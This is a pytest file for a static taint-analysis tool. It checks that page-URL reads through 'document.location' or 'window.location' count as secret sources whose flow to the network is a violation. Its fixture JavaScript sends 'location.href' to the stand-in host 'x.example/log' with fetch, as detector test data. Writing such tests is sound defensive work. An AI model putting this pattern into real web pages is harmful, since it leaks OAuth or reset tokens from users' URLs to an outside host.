# SPDX-License-Identifier: AGPL-3.0-or-later
"""The page URL is one value under one boundary, however it is spelled (INV-dadu).

``javascript.yaml`` filed ``document.location`` under ``env_read`` (a
``host_secret`` source) and ``window.location`` -- the same ``Location`` object
-- under ``host_info_read`` (``host_description``). Measured on the shipped CLI
before this change: ``fetch(u + document.location.href)`` was a
``host_secret -> network`` flow and ``fetch(u + window.location.href)`` was not.

``env_read`` is the right home for both by the owner ruling that it means "may
carry a credential" (INV-nular): a URL can carry an OAuth or reset token. The
other ``window`` globals (``navigator``, ``screen``) describe the host and stay
``host_info_read``.
"""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import main


def _run(argv: list[str], cache: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    monkeypatch.setenv("XDG_CACHE_HOME", str(cache))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(argv)
    return buf.getvalue()


@pytest.mark.parametrize("owner", ["document", "window"])
def test_the_page_url_is_a_secret_source(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, owner: str,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "a.js").write_text(
        # Source and sink on separate lines: on one line the sink cannot be
        # ordered after the source and the verdict is confirmed_with_caveats
        # (INV-muhij), which would test the ordering rule, not the boundary.
        f"function a() {{\n  const u = {owner}.location.href;\n"
        '  fetch("https://x.example/log?u=" + u);\n}\n'
        "function b() { return window.navigator.userAgent; }\n"
    )
    out = _run(["io-boundaries", str(repo), "--format", "json"], tmp_path / "cache", monkeypatch)
    chains = {b: {c["primitive"] for c in v["chains"]} for b, v in json.loads(out)["boundaries"].items()}
    assert f"{owner}.location" in chains.get("env_read", set()), chains
    assert f"{owner}.location" not in chains.get("host_info_read", set()), chains
    assert "window.navigator" in chains.get("host_info_read", set()), chains

    claims = tmp_path / "claims.yaml"
    claims.write_text(
        "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
        "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
    )
    out = _run(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"],
               tmp_path / "cache", monkeypatch)
    (verdict,) = json.loads(out)["verdicts"]
    assert verdict["verdict"] == "violated", verdict["details"]
    assert any(f"{owner}.location" in e["source_primitives"] for e in verdict["evidence"])
